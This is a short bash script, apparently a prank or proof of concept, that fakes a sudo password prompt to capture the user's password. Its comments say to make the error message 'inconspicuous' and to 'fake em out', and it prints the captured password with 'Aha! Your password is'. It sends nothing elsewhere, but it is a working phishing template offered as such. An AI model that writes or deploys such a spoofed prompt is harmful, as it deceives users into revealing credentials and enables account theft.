#!/bin/bash

if [ -z $SUDO_COMMAND ]; then
	echo "error: permission denied" # Change this message to be as inconspicuous as you want.
else
	if [ "$EUID" -ne 0 ]; then
		read -s -p "[sudo] password for $(whoami): " passw  # Fake a sudo prompt.
	else
		read -s -p "[sudo] password for $SUDO_USER: " passw # Already running as root but let's fake em out anyway.
	fi

	echo ""
	echo "Aha! Your password is $passw"
fi
